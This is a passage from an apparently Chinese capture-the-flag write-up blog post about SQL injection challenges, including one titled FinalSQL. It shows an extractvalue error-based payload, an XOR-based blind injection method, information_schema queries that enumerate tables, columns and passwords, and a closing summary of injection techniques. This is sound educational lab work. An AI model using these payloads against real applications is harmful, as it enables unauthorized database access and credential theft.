&lt;p&gt;得 flag 前半段&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvdWQ4TDVBdHY3VnlOV0RyLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/ud8L5Atv7VyNWDr.png&lt;/span&gt;&amp;quot; alt=&amp;quot;hard5&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;查后半段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)where((id)like(1))))))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaVRmY3g4cHdReW1KRUxNLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/iTfcx8pwQymJELM.png&lt;/span&gt;&amp;quot; alt=&amp;quot;hard6&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p 7725665e-c9b1-4558-b610-12bcccca00ce&gt;flag&lt;/p&gt;
&lt;h1 id=&#34;no5-finalsql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no5-finalsql&#34;&gt;#&lt;/a&gt; NO.5 FinalSQL&lt;/h1&gt;
&lt;p&gt;根据界面提示 本题可能为 sql 盲注&lt;/p&gt;
&lt;p&gt;所以先做 FUZZ 测试&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNFpBTllPcWp1M3MyUTVELnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/4ZANYOqju3s2Q5D.png&lt;/span&gt;&amp;quot; alt=&amp;quot;fin1&amp;quot; style=&amp;quot;zoom:33%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;可以发现，大部分语句被屏蔽，选择盲注。而点击 1 时，发现&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUGpIblNvUnlHSXpmdWw4LnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/PjHnSoRyGIzful8.png&lt;/span&gt;&amp;quot; alt=&amp;quot;fin2&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;而输入 7 时&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNm1yemhuRXBTYWxna2NqLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/6mrzhnEpSalgkcj.png&lt;/span&gt;&amp;quot; alt=&amp;quot;fin3&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;输入更大的超范围数同理，发现注入点&lt;/p&gt;
&lt;p&gt;用 FUZZ 测试，个别未被屏蔽，但报错信息被屏蔽&lt;/p&gt;
&lt;p&gt;最后我选择用异或 ^ 注入进行盲注：&lt;/p&gt;
&lt;p&gt;1^(sql 注入判断语句)&lt;/p&gt;
&lt;p&gt;如果显示（NO！），说明 id=1，进一步说明 sql 判断语句为 假&lt;/p&gt;
&lt;p&gt;如果显示（ERROR!!!），说明 id=0，进一步说明 sql 判断语句为 真&lt;/p&gt;
&lt;p&gt;写一个 py 跑&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvOGVRYVQ3ZnFNbmtYb0h3LnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/8eQaT7fqMnkXoHw.png&lt;/span&gt;&amp;quot; alt=&amp;quot;fin4&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;同理将 datebase () 替换为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;geek&#39;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再跑 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvc0FlQjQ5YUNrZEY2bzVTLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/sAeB49aCkdF6o5S.png&lt;/span&gt;&amp;quot; style=&amp;quot;zoom: 33%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;再换为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;F1naI1y&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再跑 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZEVYSTZPR29hSlBDckhCLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/dEXI6OGoaJPCrHB.png&lt;/span&gt;&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;再换&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(select(group_concat(passVord))from(F1naI1y))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再跑&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvc0dYdFNsUlY3UE11YUs1LnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/sGXtSlRV7PMuaK5.png&lt;/span&gt;&amp;quot; alt=&amp;quot;fin8&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;得出 flag&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
&lt;p&gt;写了一下午，当然，总结出一些 sql 相关的东西&lt;/p&gt;
&lt;p&gt;1. 页面上有显示位时，用联合注入 union；页面上没有显示位，但是有 SQL 语句执行错误信息输出时用报错注入&lt;/p&gt;
&lt;p&gt;2. 联合查询 先判断整型还是字符型，order by 查列数，获取库名，获取表名，获取字段名，获取数据&lt;/p&gt;
&lt;p&gt;3. 报错注入不用查列数，直接通过 extractvalue 函数报错查信息&lt;/p&gt;
&lt;p&gt;4. 当有绕过时，进行模糊测试，考虑是否为 双写绕过或空格绕过&lt;/p&gt;
&lt;p&gt;5. 若都不是，找可注入点进行盲注，一般这种题都会有可注入点让我们下手。盲注写 py 暴力破解即可。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="sql" />
        <updated>2021-06-20T09:25:52.913Z</updated>
    </entry>
</feed>
